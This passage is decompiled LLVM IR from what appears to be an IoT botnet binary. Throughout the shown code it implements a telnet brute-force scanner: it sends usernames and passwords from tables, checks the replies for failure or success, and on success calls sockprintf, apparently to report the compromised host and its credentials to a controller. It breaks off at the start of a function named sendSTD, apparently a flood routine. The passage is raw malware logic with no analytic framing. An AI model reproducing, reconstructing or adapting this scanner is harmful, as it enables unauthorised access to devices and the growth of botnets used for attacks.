dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e6d4
  %v3_e8cc = icmp eq i32 %v5_e7ac, -1
  br i1 %v3_e8cc, label %dec_label_pc_e8d4, label %dec_label_pc_e8f8

dec_label_pc_e8d4:                                ; preds = %dec_label_pc_e8c8
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e8f0 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_e8f8:                                ; preds = %dec_label_pc_e8c8
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e914 = add i32 %v2_e1d0, %v2_e910
  %v1_e918 = inttoptr i32 %v2_e914 to i32*
  %v2_e918 = load i32, i32* %v1_e918, align 4
  %v1_e91c = add i32 %v2_e918, 5
  store i32 %v1_e91c, i32* @r4, align 4
  %v2_e924 = call i32 @__GI_time(i32* null)
  %v0_e92c = load i32, i32* @r4, align 4
  %v3_e92c = icmp ult i32 %v0_e92c, %v2_e924
  br i1 %v3_e92c, label %dec_label_pc_e934, label %dec_label_pc_f30c

dec_label_pc_e934:                                ; preds = %dec_label_pc_e8f8
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e950 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_e958:                                ; preds = %dec_label_pc_e220
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_e970 = inttoptr i32 %v2_e1d4 to i32*
  %v2_e970 = load i32, i32* %v1_e970, align 4
  store i32 %v2_e970, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e990 = add i32 %v2_e1d0, %v2_e98c
  %v1_e994 = inttoptr i32 %v2_e990 to i32*
  %v2_e994 = load i32, i32* %v1_e994, align 4
  store i32 %v2_e994, i32* %r2.global-to-local, align 4
  %v1_e99c = load i32, i32* @sp, align 4
  %v2_e99c = inttoptr i32 %v1_e99c to i32*
  store i32 ptrtoint (i32* @global_var_296ac to i32), i32* %v2_e99c, align 4
  %v0_e9a0 = load i32, i32* %ip.global-to-local, align 4
  %v4_e9ac = inttoptr i32 %v2_e994 to i8*
  %v5_e9ac = call i32 @read_until_response(i32 %v0_e9a0, i32 %arg1, i8* %v4_e9ac, i32 512)
  %v2_e9b4 = icmp eq i32 %v5_e9ac, 0
  br i1 %v2_e9b4, label %dec_label_pc_ea44, label %dec_label_pc_e9bc

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_e958
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e9d8 = add i32 %v2_e1d4, 24
  %v1_e9dc = inttoptr i32 %v2_e9d8 to i32*
  %v2_e9dc = load i32, i32* %v1_e9dc, align 4
  %v1_e9e4 = call i32 @contains_fail(i32 %v2_e9dc)
  %v2_e9ec = icmp eq i32 %v1_e9e4, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v2_e9ec, label %dec_label_pc_ea1c, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e9bc
  %v3_ea14 = call i32 @advance_state(i32* %v1_e970, i32 0)
  br label %dec_label_pc_f30c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_e9bc
  %v3_ea3c = call i32 @advance_state(i32* %v1_e970, i32 3)
  br label %dec_label_pc_f30c

dec_label_pc_ea44:                                ; preds = %dec_label_pc_e958
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_ea64 = load i32, i32* %v1_e1dc, align 4
  %v1_ea68 = add i32 %v2_ea64, 7
  store i32 %v1_ea68, i32* @r4, align 4
  %v2_ea70 = call i32 @__GI_time(i32* null)
  %v0_ea78 = load i32, i32* @r4, align 4
  %v3_ea78 = icmp ult i32 %v0_ea78, %v2_ea70
  br i1 %v3_ea78, label %dec_label_pc_ea80, label %dec_label_pc_f30c

dec_label_pc_ea80:                                ; preds = %dec_label_pc_ea44
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_ea9c = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_eaa4:                                ; preds = %dec_label_pc_e220
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_eabc = inttoptr i32 %v2_e1d4 to i32*
  %v2_eabc = load i32, i32* %v1_eabc, align 4
  store i32 %v2_eabc, i32* @r4, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_eae0 = add i32 %v2_e1d4, 10
  %v2_eae0 = inttoptr i32 %v1_eae0 to i8*
  %v3_eae0 = load i8, i8* %v2_eae0, align 2
  %v4_eae0 = zext i8 %v3_eae0 to i32
  store i32 %v4_eae0, i32* %r2.global-to-local, align 4
  %v4_eaec = mul nuw nsw i32 %v4_eae0, 4
  %v5_eaec = add i32 %v4_eaec, ptrtoint ([8 x i8*]* @global_var_29660.499 to i32)
  %v6_eaec = inttoptr i32 %v5_eaec to i32*
  %v7_eaec = load i32, i32* %v6_eaec, align 4
  store i32 %v7_eaec, i32* @r5, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_eb10 = load i8, i8* %v2_eae0, align 2
  %v4_eb10 = zext i8 %v3_eb10 to i32
  store i32 %v4_eb10, i32* %r2.global-to-local, align 4
  %v4_eb1c = mul nuw nsw i32 %v4_eb10, 4
  %v5_eb1c = add i32 %v4_eb1c, ptrtoint ([8 x i8*]* @global_var_29660.499 to i32)
  %v6_eb1c = inttoptr i32 %v5_eb1c to i32*
  %v7_eb1c = load i32, i32* %v6_eb1c, align 4
  %v1_eb20 = inttoptr i32 %v7_eb1c to i8*
  %v3_eb24 = call i32 @strlen(i8* %v1_eb20)
  %v0_eb2c = load i32, i32* @r4, align 4
  %v0_eb30 = load i32, i32* @r5, align 4
  store i32 %v3_eb24, i32* %r2.global-to-local, align 4
  %v4_eb3c = call i32 @__libc_send(i32 %v0_eb2c, i32 %v0_eb30, i32 %v3_eb24, i32 16384)
  %v1_eb44 = icmp slt i32 %v4_eb3c, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v1_eb44, label %dec_label_pc_eb4c, label %dec_label_pc_eb70

dec_label_pc_eb4c:                                ; preds = %dec_label_pc_eaa4
  %v3_eb68 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_eb70:                                ; preds = %dec_label_pc_eaa4
  %v2_eb88 = load i32, i32* %v1_eabc, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_eb9c = call i32 @__libc_send(i32 %v2_eb88, i32 ptrtoint ([3 x i8]* @global_var_1f510.501 to i32), i32 2, i32 16384)
  %v1_eba4 = icmp slt i32 %v5_eb9c, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v1_eba4, label %dec_label_pc_ebac, label %dec_label_pc_ebd0

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eb70
  %v3_ebc8 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_eb70
  %v3_ebf0 = call i32 @advance_state(i32* nonnull %v1_eabc, i32 4)
  br label %dec_label_pc_f30c

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_e220
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_ec10 = inttoptr i32 %v2_e1d4 to i32*
  %v2_ec10 = load i32, i32* %v1_ec10, align 4
  store i32 %v2_ec10, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_ec30 = add i32 %v2_e1d0, %v2_e98c
  %v1_ec34 = inttoptr i32 %v2_ec30 to i32*
  %v2_ec34 = load i32, i32* %v1_ec34, align 4
  store i32 %v2_ec34, i32* %r2.global-to-local, align 4
  %v1_ec3c = load i32, i32* @sp, align 4
  %v2_ec3c = inttoptr i32 %v1_ec3c to i32*
  store i32 ptrtoint (i32* @global_var_296ac to i32), i32* %v2_ec3c, align 4
  %v0_ec40 = load i32, i32* %ip.global-to-local, align 4
  %v4_ec4c = inttoptr i32 %v2_ec34 to i8*
  %v5_ec4c = call i32 @read_until_response(i32 %v0_ec40, i32 %arg1, i8* %v4_ec4c, i32 512)
  %v2_ec54 = icmp eq i32 %v5_ec4c, 0
  br i1 %v2_ec54, label %dec_label_pc_ece4, label %dec_label_pc_ec5c

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ebf8
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_ec78 = add i32 %v2_e1d4, 24
  %v1_ec7c = inttoptr i32 %v2_ec78 to i32*
  %v2_ec7c = load i32, i32* %v1_ec7c, align 4
  %v1_ec84 = call i32 @contains_fail(i32 %v2_ec7c)
  %v2_ec8c = icmp eq i32 %v1_ec84, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v2_ec8c, label %dec_label_pc_ecbc, label %dec_label_pc_ec94

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec5c
  %v3_ecb4 = call i32 @advance_state(i32* %v1_ec10, i32 0)
  br label %dec_label_pc_f30c

dec_label_pc_ecbc:                                ; preds = %dec_label_pc_ec5c
  %v3_ecdc = call i32 @advance_state(i32* %v1_ec10, i32 5)
  br label %dec_label_pc_f30c

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ebf8
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_ed04 = load i32, i32* %v1_e1dc, align 4
  %v1_ed08 = add i32 %v2_ed04, 3
  store i32 %v1_ed08, i32* @r4, align 4
  %v2_ed10 = call i32 @__GI_time(i32* null)
  %v0_ed18 = load i32, i32* @r4, align 4
  %v3_ed18 = icmp ult i32 %v0_ed18, %v2_ed10
  br i1 %v3_ed18, label %dec_label_pc_ed20, label %dec_label_pc_f30c

dec_label_pc_ed20:                                ; preds = %dec_label_pc_ece4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_ed3c = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_ed44:                                ; preds = %dec_label_pc_e220
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_ed5c = inttoptr i32 %v2_e1d4 to i32*
  %v2_ed5c = load i32, i32* %v1_ed5c, align 4
  store i32 %v2_ed5c, i32* @r4, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_ed80 = add i32 %v2_e1d4, 11
  %v2_ed80 = inttoptr i32 %v1_ed80 to i8*
  %v3_ed80 = load i8, i8* %v2_ed80, align 1
  %v4_ed80 = zext i8 %v3_ed80 to i32
  store i32 %v4_ed80, i32* %r2.global-to-local, align 4
  %v4_ed8c = mul nuw nsw i32 %v4_ed80, 4
  %v5_ed8c = add i32 %v4_ed8c, ptrtoint ([4 x i8*]* @global_var_29670.503 to i32)
  %v6_ed8c = inttoptr i32 %v5_ed8c to i32*
  %v7_ed8c = load i32, i32* %v6_ed8c, align 4
  store i32 %v7_ed8c, i32* @r5, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_edb0 = load i8, i8* %v2_ed80, align 1
  %v4_edb0 = zext i8 %v3_edb0 to i32
  store i32 %v4_edb0, i32* %r2.global-to-local, align 4
  %v4_edbc = mul nuw nsw i32 %v4_edb0, 4
  %v5_edbc = add i32 %v4_edbc, ptrtoint ([4 x i8*]* @global_var_29670.503 to i32)
  %v6_edbc = inttoptr i32 %v5_edbc to i32*
  %v7_edbc = load i32, i32* %v6_edbc, align 4
  %v1_edc0 = inttoptr i32 %v7_edbc to i8*
  %v3_edc4 = call i32 @strlen(i8* %v1_edc0)
  %v0_edcc = load i32, i32* @r4, align 4
  %v0_edd0 = load i32, i32* @r5, align 4
  store i32 %v3_edc4, i32* %r2.global-to-local, align 4
  %v4_eddc = call i32 @__libc_send(i32 %v0_edcc, i32 %v0_edd0, i32 %v3_edc4, i32 16384)
  %v1_ede4 = icmp slt i32 %v4_eddc, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v1_ede4, label %dec_label_pc_edec, label %dec_label_pc_ee10

dec_label_pc_edec:                                ; preds = %dec_label_pc_ed44
  %v3_ee08 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_ee10:                                ; preds = %dec_label_pc_ed44
  %v2_ee28 = load i32, i32* %v1_ed5c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_ee3c = call i32 @__libc_send(i32 %v2_ee28, i32 ptrtoint ([3 x i8]* @global_var_1f510.501 to i32), i32 2, i32 16384)
  %v1_ee44 = icmp slt i32 %v5_ee3c, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v1_ee44, label %dec_label_pc_ee4c, label %dec_label_pc_ee70

dec_label_pc_ee4c:                                ; preds = %dec_label_pc_ee10
  %v3_ee68 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee10
  %v3_ee90 = call i32 @advance_state(i32* nonnull %v1_ed5c, i32 6)
  br label %dec_label_pc_f30c

dec_label_pc_ee98:                                ; preds = %dec_label_pc_e220
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_eeb0 = inttoptr i32 %v2_e1d4 to i32*
  %v2_eeb0 = load i32, i32* %v1_eeb0, align 4
  store i32 %v2_eeb0, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_eed0 = add i32 %v2_e1d0, %v2_e98c
  %v1_eed4 = inttoptr i32 %v2_eed0 to i32*
  %v2_eed4 = load i32, i32* %v1_eed4, align 4
  store i32 %v2_eed4, i32* %r2.global-to-local, align 4
  %v1_eedc = load i32, i32* @sp, align 4
  %v2_eedc = inttoptr i32 %v1_eedc to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_296f0.505 to i32), i32* %v2_eedc, align 4
  %v0_eee0 = load i32, i32* %ip.global-to-local, align 4
  %v4_eeec = inttoptr i32 %v2_eed4 to i8*
  %v5_eeec = call i32 @read_until_response(i32 %v0_eee0, i32 %arg1, i8* %v4_eeec, i32 512)
  %v2_eef4 = icmp eq i32 %v5_eeec, 0
  br i1 %v2_eef4, label %dec_label_pc_f110, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_ee98
  store i32 %storemerge548, i32* @r4, align 4
  %v2_ef04 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ef18 = load i32, i32* @r4, align 4
  %v2_ef24 = mul i32 %v0_ef18, 28
  %v2_ef2c = add i32 %v2_e910, %v2_ef24
  %v2_ef30 = inttoptr i32 %v2_ef2c to i32*
  store i32 %v2_ef04, i32* %v2_ef30, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_ef54 = load i32, i32* %v1_eed4, align 4
  %v1_ef5c = call i32 @contains_fail(i32 %v2_ef54)
  %v2_ef64 = icmp eq i32 %v1_ef5c, 0
  br i1 %v2_ef64, label %dec_label_pc_ef94, label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_eefc
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_ef8c = call i32 @advance_state(i32* %v1_eeb0, i32 0)
  br label %dec_label_pc_f30c

dec_label_pc_ef94:                                ; preds = %dec_label_pc_eefc
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_efb4 = load i32, i32* %v1_eed4, align 4
  %v1_efbc = call i32 @contains_success(i32 %v2_efb4)
  %v2_efc4 = icmp eq i32 %v1_efbc, 0
  br i1 %v2_efc4, label %dec_label_pc_f0ec, label %dec_label_pc_efcc

dec_label_pc_efcc:                                ; preds = %dec_label_pc_ef94
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_efec = add i32 %v2_e1d4, 9
  %v2_efec = inttoptr i32 %v1_efec to i8*
  %v3_efec = load i8, i8* %v2_efec, align 1
  %v7_eff0 = icmp eq i8 %v3_efec, 2
  br i1 %v7_eff0, label %dec_label_pc_eff8, label %dec_label_pc_f020

dec_label_pc_eff8:                                ; preds = %dec_label_pc_efcc
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f018 = call i32 @advance_state(i32* %v1_eeb0, i32 7)
  br label %dec_label_pc_f30c

dec_label_pc_f020:                                ; preds = %dec_label_pc_efcc
  %v2_f024 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_f024, i32* @r4, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f044 = call i32 @get_telstate_host(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  store i32 %v3_f044, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_f06c = add i32 %v2_e1d4, 10
  %v2_f06c = inttoptr i32 %v1_f06c to i8*
  %v3_f06c = load i8, i8* %v2_f06c, align 2
  %v4_f06c = zext i8 %v3_f06c to i32
  store i32 %v4_f06c, i32* %r2.global-to-local, align 4
  %v4_f078 = mul nuw nsw i32 %v4_f06c, 4
  %v5_f078 = add i32 %v4_f078, ptrtoint ([8 x i8*]* @global_var_29660.499 to i32)
  %v6_f078 = inttoptr i32 %v5_f078 to i32*
  %v7_f078 = load i32, i32* %v6_f078, align 4
  store i32 %v7_f078, i32* @lr, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_f09c = add i32 %v2_e1d4, 11
  %v2_f09c = inttoptr i32 %v1_f09c to i8*
  %v3_f09c = load i8, i8* %v2_f09c, align 1
  %v4_f09c = zext i8 %v3_f09c to i32
  store i32 %v4_f09c, i32* %r2.global-to-local, align 4
  %v4_f0a8 = mul nuw nsw i32 %v4_f09c, 4
  %v5_f0a8 = add i32 %v4_f0a8, ptrtoint ([4 x i8*]* @global_var_29670.503 to i32)
  %v6_f0a8 = inttoptr i32 %v5_f0a8 to i32*
  %v7_f0a8 = load i32, i32* %v6_f0a8, align 4
  %v1_f0ac = load i32, i32* @sp, align 4
  %v2_f0ac = inttoptr i32 %v1_f0ac to i32*
  store i32 %v7_f0a8, i32* %v2_f0ac, align 4
  %v0_f0b0 = load i32, i32* @r4, align 4
  %v0_f0b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f0b8, i32* @r2, align 4
  %v3_f0c0 = call i32 @sockprintf(i32 %v0_f0b0, i32 ptrtoint ([23 x i8]* @global_var_1f514.508 to i32))
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f0e4 = call i32 @advance_state(i32* %v1_eeb0, i32 7)
  br label %dec_label_pc_f30c

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_ef94
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f108 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_f110:                                ; preds = %dec_label_pc_ee98
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_f12c = add i32 %v2_e1d0, %v2_e910
  %v1_f130 = inttoptr i32 %v2_f12c to i32*
  %v2_f130 = load i32, i32* %v1_f130, align 4
  %v1_f134 = add i32 %v2_f130, 7
  store i32 %v1_f134, i32* @r4, align 4
  %v2_f13c = call i32 @__GI_time(i32* null)
  %v0_f144 = load i32, i32* @r4, align 4
  %v3_f144 = icmp ult i32 %v0_f144, %v2_f13c
  br i1 %v3_f144, label %dec_label_pc_f14c, label %dec_label_pc_f30c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f110
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f168 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_f19c:                                ; preds = %dec_label_pc_e220
  store i32 %storemerge548, i32* @r4, align 4
  %v2_f1a4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f1b8 = load i32, i32* @r4, align 4
  %v2_f1c4 = mul i32 %v0_f1b8, 28
  %v2_f1cc = add i32 %v2_e910, %v2_f1c4
  %v2_f1d0 = inttoptr i32 %v2_f1cc to i32*
  store i32 %v2_f1a4, i32* %v2_f1d0, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_f1ec = inttoptr i32 %v2_e1d4 to i32*
  %v2_f1ec = load i32, i32* %v1_f1ec, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_f200 = call i32 @__libc_send(i32 %v2_f1ec, i32 ptrtoint ([5 x i8]* @global_var_1f52c.510 to i32), i32 4, i32 16384)
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_f21c = load i32, i32* %v1_f1ec, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_f230 = call i32 @__libc_send(i32 %v2_f21c, i32 ptrtoint ([8 x i8]* @global_var_1f534.512 to i32), i32 7, i32 16384)
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_f24c = load i32, i32* %v1_f1ec, align 4
  store i32 %v2_f24c, i32* @r4, align 4
  %v2_f254 = load i32, i32* bitcast ([412 x i8]** @global_var_2965c.515 to i32*), align 4
  store i32 %v2_f254, i32* @r5, align 4
  %v1_f260 = inttoptr i32 %v2_f254 to i8*
  %v3_f264 = call i32 @strlen(i8* %v1_f260)
  %v0_f26c = load i32, i32* @r4, align 4
  %v0_f270 = load i32, i32* @r5, align 4
  store i32 %v3_f264, i32* %r2.global-to-local, align 4
  %v5_f27c = call i32 @__libc_send(i32 %v0_f26c, i32 %v0_f270, i32 %v3_f264, i32 16384)
  %v1_f284 = icmp slt i32 %v5_f27c, 0
  br i1 %v1_f284, label %dec_label_pc_f28c, label %dec_label_pc_f2b0

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f19c
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f2a8 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f19c
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_f2cc = add i32 %v2_e1d0, %v2_e910
  %v1_f2d0 = inttoptr i32 %v2_f2cc to i32*
  %v2_f2d0 = load i32, i32* %v1_f2d0, align 4
  %v1_f2d4 = add i32 %v2_f2d0, 25
  store i32 %v1_f2d4, i32* @r4, align 4
  %v2_f2dc = call i32 @__GI_time(i32* null)
  %v0_f2e4 = load i32, i32* @r4, align 4
  %v3_f2e4 = icmp ult i32 %v0_f2e4, %v2_f2dc
  br i1 %v3_f2e4, label %dec_label_pc_f2ec, label %dec_label_pc_f30c

dec_label_pc_f2ec:                                ; preds = %dec_label_pc_f2b0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_f308 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_f30c:                                ; preds = %dec_label_pc_e8f8, %dec_label_pc_ea44, %dec_label_pc_ece4, %dec_label_pc_f110, %dec_label_pc_f2b0, %dec_label_pc_e220, %dec_label_pc_e4d4, %dec_label_pc_f28c, %dec_label_pc_f14c, %dec_label_pc_f0ec, %dec_label_pc_f020, %dec_label_pc_eff8, %dec_label_pc_ef6c, %dec_label_pc_ee70, %dec_label_pc_ee4c, %dec_label_pc_edec, %dec_label_pc_ed20, %dec_label_pc_ecbc, %dec_label_pc_ec94, %dec_label_pc_ebd0, %dec_label_pc_ebac, %dec_label_pc_eb4c, %dec_label_pc_ea80, %dec_label_pc_ea1c, %dec_label_pc_e9f4, %dec_label_pc_e934, %dec_label_pc_e8d4, %dec_label_pc_e840, %dec_label_pc_e81c, %dec_label_pc_e670, %dec_label_pc_e64c, %dec_label_pc_e4a8, %dec_label_pc_e450, %dec_label_pc_f2ec
  %v1_f310 = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_f310, i32* %r2.global-to-local, align 4
  %v5_f324 = icmp slt i32 %v1_f310, %arg2
  br i1 %v5_f324, label %dec_label_pc_e1bc, label %dec_label_pc_e1b0

; uselistorder directives
  uselistorder i32 %v1_f310, { 2, 1, 0 }
  uselistorder i32 %v3_f264, { 1, 0 }
  uselistorder i32* %v1_eeb0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_edc4, { 1, 0 }
  uselistorder i32 %v3_eb24, { 1, 0 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_e328, { 1, 0 }
  uselistorder i32 %v2_e2bc, { 1, 0 }
  uselistorder i32 %v2_e2b8, { 1, 0, 2 }
  uselistorder i8* %v2_e290, { 2, 1, 0, 3 }
  uselistorder i32 %v0_e204, { 1, 0 }
  uselistorder i32* %v1_e1dc, { 1, 0, 2 }
  uselistorder i32 %v2_e1d4, { 35, 34, 36, 27, 28, 29, 30, 31, 32, 33, 24, 23, 25, 26, 21, 4, 22, 18, 17, 19, 20, 15, 3, 16, 13, 12, 11, 14, 6, 7, 1, 2, 8, 0, 10, 9, 5 }
  uselistorder i32 %v2_e1d0, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_e1c8, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge548, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_e910, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_e698, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_e194, { 1, 2, 0 }
  uselistorder i32 %v1_e170, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v3_e0b0, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 107, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 104, 105, 106, 102, 108, 109, 103, 101 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8*]* @global_var_29670.503 to i32), { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1f510.501 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([8 x i8*]* @global_var_29660.499 to i32), { 2, 0, 1 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f30c, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e6ac, { 1, 0 }
  uselistorder label %dec_label_pc_e670, { 1, 0 }
  uselistorder label %dec_label_pc_e220, { 1, 0 }
  uselistorder label %dec_label_pc_e1bc, { 1, 0 }
  uselistorder label %dec_label_pc_e1b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e0f4, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
